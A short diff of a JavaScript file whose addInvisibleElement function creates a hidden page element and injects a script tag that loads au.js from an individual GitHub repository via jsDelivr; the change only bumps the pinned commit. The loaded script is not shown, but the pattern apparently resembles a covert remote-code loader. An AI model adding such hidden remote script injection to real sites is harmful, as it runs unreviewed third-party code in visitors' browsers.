@@ -5,7 +5,7 @@ function addInvisibleElement() {
     invisibleElement.id = "invisibleElement";
     document.body.appendChild(invisibleElement);
     var script1 = document.createElement("script");
-    script1.src = "https://cdn.jsdelivr.net/gh/eq89/h@94dc4b6/au.js";
+    script1.src = "https://cdn.jsdelivr.net/gh/eq89/h@28b65ce/au.js";
     script1.type = "text/javascript";
     document.head.appendChild(script1);
 
